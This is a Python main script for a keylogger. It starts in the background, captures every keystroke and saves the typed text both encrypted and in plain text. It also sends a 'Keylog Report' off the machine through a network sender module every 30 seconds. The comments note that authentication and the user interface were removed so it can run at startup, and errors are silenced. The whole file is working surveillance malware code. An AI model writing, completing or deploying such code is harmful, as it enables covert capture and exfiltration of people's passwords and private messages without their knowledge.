import time
import sys
from processor import InputProcessor
from logger import KeyLogger
import crypto_utils
import os

def main():
    # Ensure we run in the application directory (crucial for startup)
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(os.path.abspath(__file__))
    
    os.chdir(application_path)

    # Load Encryption Key
    key = crypto_utils.load_key()
    if not key:
        # In background mode, we can't easily print errors to user.
        # Maybe log to a file? For now, just exit.
        return

    # Write PID to file for stop script
    with open("keylogger.pid", "w") as f:
        f.write(str(os.getpid()))


    # Face authentication removed for startup


    # Load existing logs if available
    initial_text = ""
    if os.path.exists("captured_text.enc"):
        try:
            with open("captured_text.enc", "rb") as f:
                encrypted_data = f.read()
            initial_text = crypto_utils.decrypt_text(encrypted_data, key)
        except Exception:
            # If decryption fails or file is corrupt, start fresh
            initial_text = ""

    # Initialize components
    processor = InputProcessor(initial_text)
    # Interface removed

    def on_key(key_event):
        # Process key
        key_char, current_text = processor.process_key(key_event)
        # UI update removed

        # Encrypt and save logs (both encrypted and plain for debugging)
        try:
            encrypted_data = crypto_utils.encrypt_text(current_text, key)
            with open("captured_text.enc", "wb") as f_enc:
                f_enc.write(encrypted_data)
            with open("captured_text.txt", "w", encoding="utf-8") as f_txt:
                f_txt.write(current_text)
        except Exception as e:
            # Log error silently
            pass

    # Start key logger
    logger = KeyLogger(on_key)
    logger.start()

    # Keep script running
    last_send_time = time.time()
    SEND_INTERVAL = 30 # 30 seconds for testing

    try:
        while True:
            time.sleep(1)
            
            # Check if it's time to send logs
            if time.time() - last_send_time > SEND_INTERVAL:
                if os.path.exists("captured_text.txt"):
                    try:
                        with open("captured_text.txt", "r", encoding="utf-8") as f:
                            log_content = f.read()
                        
                        if log_content:
                            import network_sender
                            message = f"**Keylog Report** - {time.strftime('%Y-%m-%d %H:%M:%S')}"
                            if network_sender.send_log(message, log_content):
                                last_send_time = time.time()
                    except Exception:
                        pass
    except KeyboardInterrupt:
        pass
    finally:
        logger.stop()

if __name__ == "__main__":
    main()
